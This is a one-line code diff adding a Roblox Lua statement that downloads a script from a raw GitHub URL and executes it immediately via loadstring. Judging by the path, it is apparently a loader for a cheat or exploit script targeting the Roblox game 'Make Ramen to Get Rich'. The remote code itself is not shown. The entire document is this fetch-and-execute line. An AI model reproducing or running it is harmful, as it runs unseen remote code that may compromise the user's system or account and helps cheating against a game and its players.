@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/make-ramen-to-get-rich-release-spam7-0o56l5v3kxlja6.lua"))()
